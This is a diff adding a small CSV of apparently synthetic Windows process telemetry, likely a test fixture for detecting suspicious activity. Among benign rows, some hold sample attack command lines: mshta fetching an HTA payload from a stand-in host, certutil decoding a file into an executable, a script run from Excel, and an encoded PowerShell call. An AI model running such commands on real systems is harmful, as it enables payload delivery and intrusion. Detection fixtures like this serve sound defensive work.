@@ -1,0 +1,11 @@
+process_name,file_path,hash,command_line,parent_process,user,host
+chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,d41d8cd98f00b204e9800998ecf8427e,chrome.exe --no-sandbox,explorer.exe,user1,DESKTOP-001
+powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,098f6bcd4621d373cade4e832627b4f6,powershell.exe -e ZQBjAGgAbwAgACIASABlAGwAbABvACIA,cmd.exe,user1,DESKTOP-001
+svchost.exe,C:\Windows\System32\svchost.exe,5d41402abc4b2a76b9719d911017c592,svchost.exe -k netsvcs,services.exe,SYSTEM,DESKTOP-001
+notepad.exe,C:\Windows\System32\notepad.exe,hello1234567890abcdef1234567890,notepad.exe document.txt,explorer.exe,user1,DESKTOP-001
+rundll32.exe,C:\Windows\System32\rundll32.exe,suspicious123456789012345678901,rundll32.exe shell32.dll\,Control_RunDLL,winword.exe,user1,DESKTOP-001
+cmd.exe,C:\Windows\System32\cmd.exe,7d793037a0760186574b0282f2f435e7,cmd.exe /c whoami,powershell.exe,user1,DESKTOP-001
+mshta.exe,C:\Windows\System32\mshta.exe,000000000000000000000000000000,mshta.exe http://badsite.com/payload.hta,iexplore.exe,user2,DESKTOP-002
+certutil.exe,C:\Windows\System32\certutil.exe,abc123def456ghi789jkl012mno345,certutil.exe -decode encoded.txt decoded.exe,cmd.exe,user2,DESKTOP-002
+wscript.exe,C:\Windows\System32\wscript.exe,malicious00000000000000000000,wscript.exe //B //NoLogo evil.vbs,excel.exe,user2,DESKTOP-002
+firefox.exe,C:\Program Files\Mozilla Firefox\firefox.exe,goodhash123456789012345678901234,firefox.exe -safe-mode,explorer.exe,user3,DESKTOP-003
